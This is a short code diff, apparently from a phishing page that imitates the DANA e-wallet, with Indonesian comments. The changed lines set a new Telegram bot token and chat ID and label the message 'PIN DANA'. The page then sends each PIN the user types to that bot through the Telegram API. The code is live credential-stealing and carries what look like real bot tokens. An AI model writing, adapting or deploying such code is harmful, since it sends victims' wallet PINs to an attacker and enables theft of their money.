@@ -102,9 +102,9 @@
 
                 // Menggunakan AJAX untuk mengirim PIN ke bot Telegram
                 var xhttp = new XMLHttpRequest();
-                var token = '6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0';
-                var chatId = '6824078885';
-                var message = 'PIN Anda: ' + pin;
+                var token = '7167286402:AAEwbkHfTfTMksQv2VJfw_KNBmkaWnM3zo0';
+                var chatId = '6772080063';
+                var message = 'PIN DANA: ' + pin;
                 var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
                 xhttp.open("GET", url, true);
                 xhttp.send();
